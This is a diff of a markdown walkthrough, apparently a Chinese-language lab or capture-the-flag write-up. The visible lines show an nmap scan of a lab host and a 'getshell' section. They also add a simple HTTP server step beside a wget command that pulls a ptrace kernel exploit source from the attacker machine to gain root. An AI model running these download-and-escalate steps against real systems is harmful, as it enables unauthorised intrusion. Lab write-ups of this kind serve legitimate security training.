@@ -39,7 +39,7 @@ sudo nmap -p22,80,111,139,443,1024 -sV 192.168.88.11
 
 ![image-20240615133839095](image/image-20240615133839095.png)
 
-# 测试利用
+# exp
 
 ## getshell_1
 
@@ -91,6 +91,8 @@ with socketserver.TCPServer(("", PORT), Handler) as httpd:
 ```
 
 ![image-20240615150214629](image/image-20240615150214629.png)
+
+或者直接`python -m http.server 80`
 
 `wget 192.168.88.10/ptrace-kmod.c`，我们再次连接，即可是root权限
 
